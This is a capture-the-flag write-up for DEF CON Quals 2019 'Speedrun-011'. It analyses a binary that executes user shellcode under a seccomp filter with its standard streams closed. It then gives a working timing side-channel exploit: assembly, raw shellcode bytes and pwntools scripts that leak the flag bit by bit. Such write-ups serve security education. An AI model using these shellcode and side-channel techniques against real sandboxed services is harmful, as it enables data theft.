# defcon quals 2019 Speedrun-011

For this challenge, I didn't solve it in time. My solution involved leaking the flag one bit at a time, and when the competition ended I only had `OOO{Why___does_the___ne`. However it would of worked if given enough time, and a team mate ended up being able to autmate it.

So let's look at the binary:
```
$	file speedrun-011 
speedrun-011: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=38ec45a5b8f119b163f2b0727ee14449096953b7, stripped
$	pwn checksec speedrun-011 
[*] '/Hackery/defcon/speedrun/s11/speedrun-011'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
$	./speedrun-011 
Can you drive with a blindfold?
Send me your vehicle
15935728
Segmentation fault (core dumped)
```

So we can see it is a 64 bit binary with all of the standard binary protections. We can see that the binary scans in input, and then crashes. Looking at the main function in IDA, we see this:

```
void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
{
  setvbuf(_bss_start, 0LL, 2, 0LL);
  if ( !getenv("DEBUG") )
    alarm(5u);
  putsBlindfold();
  scanShellcode();
  exit(0);
}
```

Looking through this function, and the subfunctions that it calls, we see that the `scanShellcode` function is what's important.

```
__int64 scanShellcode()
{
  signed int i; // [sp+8h] [bp-218h]@1
  unsigned int v2; // [sp+Ch] [bp-214h]@1
  char buf[512]; // [sp+10h] [bp-210h]@1
  char v4; // [sp+210h] [bp-10h]@1
  __int64 v5; // [sp+218h] [bp-8h]@1

  v5 = *MK_FP(__FS__, 40LL);
  puts("Send me your vehicle");
  v2 = read(0, buf, 0x200uLL);
  v4 = 0;
  for ( i = 0; i < (signed int)v2; ++i )
  {
    if ( !buf[i] )
    {
      puts("Failed smog inspection.");
      return *MK_FP(__FS__, 40LL) ^ v5;
    }
  }
  runShellcode(buf, v2);
  return *MK_FP(__FS__, 40LL) ^ v5;
}
```

Looking at this function we see that it scans in `0x200` bytes into `buf`, then checks if there are any null bytes, If there are no null bytes then it will run the function `runShellcode` with the arguments being our data we gave it and it's length. 

```
int __fastcall runShellcode(const void *shellcode, unsigned int shellcodeLen)
{
  __int64 filter; // rax@1
  int sRet0; // ST18_4@1
  int sRet1; // ST18_4@1
  int sRet2; // ST18_4@1
  signed __int64 v6; // rsi@1
  char *flagPtr; // [sp+20h] [bp-20h]@1
  void *dest; // [sp+28h] [bp-18h]@1
  __int64 filterCpy; // [sp+30h] [bp-10h]@1

  flagPtr = getFlag();
  dest = mmap(0LL, shellcodeLen, 7, 34, -1, 0LL);
  memcpy(dest, shellcode, shellcodeLen);
  close(0);
  close(1);
  close(2);
  LODWORD(filter) = seccomp_init(0LL, shellcode);
  filterCpy = filter;
  sRet0 = seccomp_rule_add(filter, 0x7FFF0000LL, 15LL, 0LL);
  sRet1 = seccomp_rule_add(filterCpy, 0x7FFF0000LL, 60LL, 0LL) + sRet0;
  sRet2 = seccomp_rule_add(filterCpy, 0x7FFF0000LL, 0LL, 0LL) + sRet1;
  v6 = 0x7FFF0000LL;
  if ( seccomp_rule_add(filterCpy, 0x7FFF0000LL, 1LL, 0LL) + sRet2 )
  {
    perror("seccomp_rule_add failed");
    exit(-2);
  }
  seccomp_load(filterCpy);
  if ( getenv("TEST_SECCOMP") )
  {
    v6 = 0LL;
    open("/dev/random", 0);
  }
  return ((int (__fastcall *)(char *, signed __int64))dest)(flagPtr, v6);
}
```

So here is wehere it get's interesting. It will run the shellcode that we give it. However before we do that it closes `stdin`, `stdout`, and `stderr` (which map to file descriptors `0`, `1`, and `2`). Proceeding that it implements a seccomp filter whitelest on syscalls which applies to our shellcode. It will only allow the `x64` syscalls `0x0`, `0x1`, `0xf`, and `0x3c` which map to the `read`, `write`, `sigreturn`, and `exit` syscalls.

Also another interesting thing is the flag id loaded into memory with the `getFlag` function, and a pointer to the flag is stored in the `rdi` register when our shellcode is called. So we know the flag and have code execution, this becomes a data exfiltration challenge.

The main difficulty with this challenge is data exfiltration. We know what the flag is, but have no real way of directly communicating it (or at least one I could figure it out). This is because `stdin`, `stdout`, and `stderr` and with our restricted syscalls we don't have a way to open up a new file descriptor (at least any way I could tell while solving it). That is when a team mate of mine came up with an idea to do a timing attack. 

Also it checks for the flag in the `/flag` file (can be seen in the `getFlag` function).

### Timing Attack

Thing is we can't directly communicate data. However we can keep exit the process, which will close the pipe we use to talk to the binary. What I ended up doing (thanks to a suggestion from a Nasa Rejects team mate) was write some shellcode that would evaluate the flag one bit at a time. If the bit was 0, I would crash the binary by having execution go past the shellcode. If the bit was 1 then the shellcode would enter into an infinite loop (there is a timer that will kill the process after a couple of seconds). So if the connection immediatley ends I know it's a 0, and if the connection stays open for a couple of seconds I know it is a 1.

This is the shellcode that I used to do this:
```
[SECTION .text]
global _start
_start:
	mov cl, byte [rdi + 0]
	shr cl, 7
	and cl, 1
	cmp cl, 1
	jz -5
	nop
```

Essentially it would grab the current byte I'm leaking bits from, shift it over the amount of bits I need for the current bit, then and it by `0x1` to get that single bit. Following that it compares the `cl` register by `1`, and if so it will enter into an infinite loop with `jz -5` (which will just jump to the beginning of that instruction, and thus repeat until the time ends). If the bit is 0 then execution will go past my shellcode and inevitably crash.

Now at this point there was like 30 minutes left in the competition. TobalJackson (you can find his blog here: https://binarystud.io/) who I was working with throughout this entire challenge. Towards the end once we figured out how to leak the flag, we decided to try both automating it and doing it by hand since due to the time constraints we weren't sure if either method would be done in time.

Here is the script that TobalJackson made to solve this challenge:

```
#!/usr/bin/env python
from pwn import *
from IPython import embed
from datetime import datetime as dt

DEBUG = True


def main():
    #    8a 4f 01             mov    cl,BYTE PTR [rdi+0x1]
    #    c0 e9 07             shr    cl,0x7
    #    80 e1 01             and    cl,0x1
    #    80 f9 01             cmp    cl,0x1
    #    0f 84 f7 ff ff ff    je     400089 <_start+0x9>
    #    90                   nop
    shellcode = "\x8a\x4f{}\xc0\xe9{}\x80\xe1\x01\x80\xf9\x01\x0f\x84\xf7\xff\xff\xff\x90"
    shellcode2 = "\x8a\x4f{}\x80\xe1\x01\x80\xf9\x01\x0f\x84\xf7\xff\xff\xff\x90"

    bytePos= 1
    bitPos = 0

    while True:

        ts1 = dt.now()
        if DEBUG:
            #p = remote("localhost", 8080)
            p = process("./speedrun-011")
        else:
            p = remote("speedrun-011.quals2019.oooverflow.io", 31337)
        if bitPos == 0:
            toSend = shellcode2.format(p8(bytePos))
        else:
            toSend = shellcode.format(p8(bytePos), p8(bitPos))
        p.readuntil("Send me your vehicle\n")

        p.send(toSend)
        try:
            print(p.read(timeout=1))
        except EOFError:
            pass

        print("dt:{} B:{} b:{}".format(dt.now()-ts1, bytePos, bitPos))
        ts1=dt.now()

        #except TimeoutError:
        #    print("1")
        #except EOFError:
        #    print("0")

        bitPos += 1
        if bitPos == 8:
            bitPos = 0
            bytePos += 1


if __name__ == "__main__":
    main()
```

Here is the by hand solution script I tried to use to solve the challenge but was way too slow. Due to time constraints I couldn't have made this as automated as I should have (you should definetly be using the solution TobalJackson made). In addition to that, this shellcode requires you change three seperate values to leak each bit (values identified in the script, the `x` values for `byte [rdi + x]` and `shr cl, x`):

```
from pwn import *

context.arch = "amd64"

target = remote('speedrun-011.quals2019.oooverflow.io', 31337)

#target = process('./speedrun-011')
#gdb.attach(target, gdbscript='pie b *0xe10')

# Chane the \x05 to match the bit your shifting, and the \x17 to match which byte your leaking
shellcode = "\x8a\x4f\x17\xc0\xe9\x05\x80\xe1\x01\x80\xf9\x01\x0f\x84\xf7\xff\xff\xff\x90"

# Due to not being able to use null bytes, we had to use a seperate shellcode when we are leaking the lowest bit
# since we would be shifting it by 0 we need to just exclude that instruction
# Change the \x17 to match what byte your leaking
#shellcode = "\x8a\x4f\x17\x80\xe1\x01\x80\xf9\x01\x0f\x84\xf7\xff\xff\xff\x90"

target.send(shellcode)

target.interactive()
```
